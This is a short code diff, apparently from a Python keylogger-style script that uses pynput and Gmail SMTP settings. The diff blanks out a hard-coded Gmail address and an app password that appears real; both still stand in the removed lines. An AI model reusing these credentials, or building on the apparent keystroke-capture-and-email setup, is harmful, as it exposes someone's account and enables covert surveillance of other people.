@@ -5,8 +5,8 @@ from pynput import keyboard
 
 SMTP_SERVER = 'smtp.gmail.com'
 SMTP_PORT = 587
-EMAIL_ADDRESS = 'yeshua200530@gmail.com'
-EMAIL_PASSWORD = 'tbum ubqe ilpi hbmj'
+EMAIL_ADDRESS = ''
+EMAIL_PASSWORD = ''
 
 enter_count = 0
 
